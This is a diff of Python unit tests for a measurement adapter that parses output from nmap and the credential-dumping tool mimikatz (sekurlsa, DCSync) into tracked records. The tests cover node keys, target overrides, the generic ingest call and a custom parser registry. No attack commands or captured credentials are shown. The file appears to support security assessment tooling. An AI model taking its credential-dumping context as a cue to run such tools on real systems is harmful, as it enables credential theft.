     def test_auto_cycle_discovery(self):
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
@@ -540,12 +797,16 @@ class TestMeasurementAdapter:
         assert len(pearls) > 0
         assert pearls[0].cycle_id.startswith("auto_")
 
-    def test_node_key_from_adapter(self):
-        """Explicit adapter node_key takes precedence over event target."""
+    def test_node_key_from_adapter_non_nmap(self):
+        """For non-nmap tools, adapter node_key flows through to pearls."""
         adapter = MeasurementAdapter("eng-01", node_key="FIXED-HOST")
-        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
-        for p in pearls:
-            assert p.node_key == "FIXED-HOST"
+        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c01")
+        assert all(p.node_key == "FIXED-HOST" for p in pearls)
+
+    def test_target_override_non_nmap(self):
+        adapter = MeasurementAdapter("eng-01", node_key="DEFAULT-HOST")
+        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c01", target="OVERRIDE-HOST")
+        assert all(p.node_key == "OVERRIDE-HOST" for p in pearls)
 
     def test_no_layer0_effect(self):
         from invar.core.support_engine import SupportEngine
@@ -561,7 +822,33 @@ class TestMeasurementAdapter:
     def test_deterministic(self):
         def run():
             a = MeasurementAdapter("eng-01", node_key="HOST")
-            a.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
             a.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03")
             return [(p.gate_id, p.cycle_id) for p in a.pearls()]
         assert run() == run()
+
+    def test_ingest_generic_api(self):
+        """adapter.ingest(source, raw) is the primary entry point."""
+        adapter = MeasurementAdapter("eng-01", node_key="HOST")
+        pearls = adapter.ingest("mimikatz", MIMIKATZ_DCSYNC, cycle_id="c03")
+        assert len(pearls) > 0
+
+    def test_unknown_source_returns_empty(self):
+        adapter = MeasurementAdapter("eng-01", node_key="HOST")
+        pearls = adapter.ingest("unknown_tool_xyz", "garbage output", cycle_id="c01")
+        assert pearls == []
+
+    def test_custom_registry(self):
+        from invar.adapters.measurement.tool_normalizer import ToolNormalizer
+
+        class OneEventNormalizer(ToolNormalizer):
+            def source_name(self): return "mytool"
+            def supports(self, source): return source == "mytool"
+            def parse(self, raw, ctx):
+                return [self._event("discover_custom_gate", ctx, "frag")]
+
+        reg = NormalizerRegistry()
+        reg.register(OneEventNormalizer())
+        adapter = MeasurementAdapter("eng-01", node_key="HOST", registry=reg)
+        pearls = adapter.ingest("mytool", "anything", cycle_id="c01")
+        assert len(pearls) == 1
+        assert pearls[0].gate_id == "discover_custom_gate"
